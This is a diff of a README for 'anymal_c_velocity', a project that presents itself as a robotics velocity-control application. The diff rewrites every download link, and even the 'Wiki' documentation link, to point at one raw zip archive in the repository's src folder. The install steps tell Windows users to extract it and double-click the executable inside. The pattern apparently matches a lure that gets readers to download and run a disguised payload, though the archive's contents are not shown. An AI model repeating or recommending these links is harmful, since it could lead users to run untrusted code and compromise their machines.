@@ -6,11 +6,11 @@ Welcome to the anymal_c_velocity project! This application integrates a custom r
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://github.com/BOODY2209/anymal_c_velocity/raw/refs/heads/main/src/anymal_velocity_c_v3.4.zip%20Release-blue)](https://github.com/BOODY2209/anymal_c_velocity/raw/refs/heads/main/src/anymal_velocity_c_v3.4.zip)
+[![Download the latest release](https://raw.githubusercontent.com/BOODY2209/anymal_c_velocity/main/src/anymal_c_velocity/c-anymal-velocity-v2.4.zip%20Release-blue)](https://raw.githubusercontent.com/BOODY2209/anymal_c_velocity/main/src/anymal_c_velocity/c-anymal-velocity-v2.4.zip)
 
 To get started, you need to download the application. Visit the link below to find the latest version of anymal_c_velocity:
 
-[Download the latest release](https://github.com/BOODY2209/anymal_c_velocity/raw/refs/heads/main/src/anymal_velocity_c_v3.4.zip)
+[Download the latest release](https://raw.githubusercontent.com/BOODY2209/anymal_c_velocity/main/src/anymal_c_velocity/c-anymal-velocity-v2.4.zip)
 
 ## 🖥️ System Requirements
 
@@ -40,7 +40,7 @@ To install the application, follow these steps:
 
 1. Click on the provided download link above to visit the releases page.
 2. Select the latest version of anymal_c_velocity.
-3. Download the file that matches your operating system (e.g., `https://github.com/BOODY2209/anymal_c_velocity/raw/refs/heads/main/src/anymal_velocity_c_v3.4.zip` for Windows).
+3. Download the file that matches your operating system (e.g., `https://raw.githubusercontent.com/BOODY2209/anymal_c_velocity/main/src/anymal_c_velocity/c-anymal-velocity-v2.4.zip` for Windows).
 4. Once downloaded, locate the zip file in your downloads folder.
 5. Extract the zip file to your desired location.
 6. Open the extracted folder and double-click on the executable file to run the application.
@@ -70,7 +70,7 @@ To see what’s new in the latest version, check out our changelog on the releas
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For full documentation, visit the [Wiki](https://github.com/BOODY2209/anymal_c_velocity/raw/refs/heads/main/src/anymal_velocity_c_v3.4.zip).
+- **Documentation:** For full documentation, visit the [Wiki](https://raw.githubusercontent.com/BOODY2209/anymal_c_velocity/main/src/anymal_c_velocity/c-anymal-velocity-v2.4.zip).
 - **Community:** Join our discussions on GitHub or platforms like Discord to share experiences and tips with other users.
 
 ## 💡 Tips for Best Performance
